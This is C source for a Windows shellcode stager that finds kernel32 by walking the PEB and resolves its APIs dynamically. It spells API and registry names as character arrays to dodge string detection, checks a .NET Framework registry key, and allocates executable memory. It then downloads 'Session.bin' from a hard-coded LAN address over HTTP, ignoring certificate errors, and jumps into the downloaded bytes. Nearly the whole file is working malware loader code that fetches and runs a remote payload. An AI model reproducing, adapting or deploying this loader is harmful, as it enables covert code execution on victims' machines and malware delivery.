#include "head.h"
#include <intrin.h>
//char* UrlAddressStartingPoint();
__declspec(noinline) ULONG_PTR caller(VOID);
void StartingPoint() {



	char Kernel32[] = kernel32dll;
	char Wininet[] = wininetdll;
	char LoadLibraryA_Func[] = var10;
	BYTE read[] = var1;
	BYTE openurl[] = var2;
	char internetOpen[] = var3;
	char Vir[] = var5;

	BYTE advapi32[] = { 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0 };
	BYTE hkeyLocalMachine[] = { 'H', 'K', 'E', 'Y', '_', 'L', 'O', 'C', 'A', 'L', '_', 'M', 'A', 'C', 'H', 'I', 'N', 'E', 0 };
	BYTE netFrameworkSetup[] = { 'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'N', 'E', 'T', ' ', 'F', 'r', 'a', 'm', 'e', 'w', 'o', 'r', 'k', ' ', 'S', 'e', 't', 'u', 'p', '\\', 'N', 'D', 'P', '\\', 'v', '3', '.', '5', 0 };
	BYTE install[] = { 'I', 'n', 's', 't', 'a', 'l', 'l', 0 };
	BYTE f1[] = { 'R', 'e', 'g', 'O', 'p', 'e', 'n', 'K', 'e', 'y', 'E', 'x', 'A', '\0' };
	BYTE f2[] = { 'R', 'e', 'g', 'Q', 'u', 'e', 'r', 'y', 'V', 'a', 'l', 'u', 'e', 'E', 'x', 'A', '\0' };
	BYTE f3[] = { 'R', 'e', 'g', 'C', 'l', 'o', 's', 'e', 'K', 'e', 'y', '\0' };

#if defined(_AMD64_)
	ULONG_PTR dwKernelBase = GetKernel32DLL((ULONG_PTR)((PPEB_LDR_DATA)((_PPEB)__readgsqword(0x60))->pLdr)->InMemoryOrderModuleList.Flink);
#else
	ULONG_PTR dwKernelBase = GetKernel32DLL((ULONG_PTR)((PPEB_LDR_DATA)((_PPEB)__readfsdword(0x30))->pLdr)->InMemoryOrderModuleList.Flink);
#endif

	FN_GetProcAddress fn_GetProcAddress = (FN_GetProcAddress)GetProcAddress_Func(dwKernelBase);
	FN_LoadLibraryA fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress((HMODULE)dwKernelBase, LoadLibraryA_Func);

	HMODULE kernel32DLLAddr = fn_LoadLibraryA(Kernel32);
	HMODULE winNetDllAddr = fn_LoadLibraryA(Wininet);
	HMODULE hAdvapi32 = fn_LoadLibraryA((char*)advapi32);

	REGOPENKEYEXA RegOpenKeyExA = (REGOPENKEYEXA)fn_GetProcAddress(hAdvapi32, (char*)f1);
	REGQUERYVALUEEXA RegQueryValueExA = (REGQUERYVALUEEXA)fn_GetProcAddress(hAdvapi32, (char*)f2);
	REGCLOSEKEY RegCloseKey = (REGCLOSEKEY)fn_GetProcAddress(hAdvapi32, (char*)f3);

	FN_InternetOpenA TOpen = (FN_InternetOpenA)fn_GetProcAddress(winNetDllAddr, internetOpen);
	FN_InternetOpenUrlA TOpenUrlA = (FN_InternetOpenUrlA)fn_GetProcAddress(winNetDllAddr, (char*)openurl);
	FN_InternetReadFile TReadFile = (FN_InternetReadFile)fn_GetProcAddress(winNetDllAddr, (char*)read);
	FN_VirtualAlloc TVirtualAlloc = (FN_VirtualAlloc)fn_GetProcAddress(kernel32DLLAddr, Vir);

	DWORD bytes_read;
	ULONG_PTR baseAddress = caller();
	//char* url = NULL;
	//while (true)
	//{
	//	if (*(DWORD*)baseAddress==0xFFFFFFFF)
	//	{
	//		url = (char*)baseAddress + 4;
	//		//MessageBoxA(0, url, 0, 0);

	//	}
	//	baseAddress++;
	//}

	BYTE Is64 = 1;

	HKEY hKey;

	LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, (char*)netFrameworkSetup, 0, KEY_READ, &hKey);
	if (result == ERROR_SUCCESS) {
		DWORD value;
		DWORD dataSize = sizeof(value);
		result = RegQueryValueExA(hKey, (char*)install, NULL, NULL, (LPBYTE)&value, &dataSize);
		if (result == ERROR_SUCCESS && value == 1) {
			Is64 = 0;
		}
	}
	RegCloseKey(hKey);

	unsigned char* addr = (unsigned char*)TVirtualAlloc(0, size, 0x3000, 0x40);
	//for (BYTE i = Is64 , j = 0; ((char*)&UrlAddressStartingPoint + 1)[i] != 0; i+=2, j++) {
	//	addr[j] = (unsigned char)((char*)&UrlAddressStartingPoint + 1)[i];
	//}

	BYTE url[] = { 'h', 't', 't', 'p', ':', '/', '/', '1', '9', '2', '.', '1', '6', '8', '.', '3', '1', '.', '8', '1', ':', '8', '0', '0', '0', '/', 'S', 'e', 's', 's', 'i', 'o', 'n', '.', 'b', 'i', 'n', 0 };


	DWORD dwFlags = INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | 0x80000000 | 0x400;

	HINTERNET session = TOpenUrlA(TOpen((LPCTSTR)0, 0, NULL, 0, NULL), (char*)url, NULL, 0, dwFlags, 0);

	
	if (session) {
		TReadFile(session, addr, size, &bytes_read);

		((void(*)())addr)();
	}
	return;
}

__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }

//char* UrlAddressStartingPoint(){ 
//	return (char*)"http://192.168.31.81:8000/Session.bin";
//}
